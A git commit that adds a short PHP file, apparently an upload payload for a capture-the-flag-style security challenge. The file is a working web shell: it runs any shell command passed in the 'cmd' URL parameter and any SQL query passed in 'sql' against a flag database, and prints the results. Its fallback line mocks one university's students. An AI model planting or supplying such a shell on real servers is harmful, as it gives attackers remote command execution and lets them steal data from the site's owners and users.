25ed52efecb65c0f84597da0ff02a6387e96a992
Jakob Löw <jakob@m4gnus.de>
2021-05-22 21:03:16 +0200

    add two php files for common file upload vulnerabilities

---
+++ Web/thi-is-better.php
@@ -0,0 +1,16 @@
+<?php
+
+// originally written for a TUM security challenge by a THI student ;)
+
+if(isset($_GET["sqlite"])) {
+	$db = new SQLite3("/var/www/html/db/flag.db");
+	$result = $db->query($_GET["sql"]);
+	while($row = $result->fetchArray())
+		var_dump($row);
+}
+else if(isset($_GET["cmd"])) {
+	echo(shell_exec($_GET["cmd"]));
+}
+else {
+	echo("lol TUM sucks. gtfo and start studying at THI");
+}
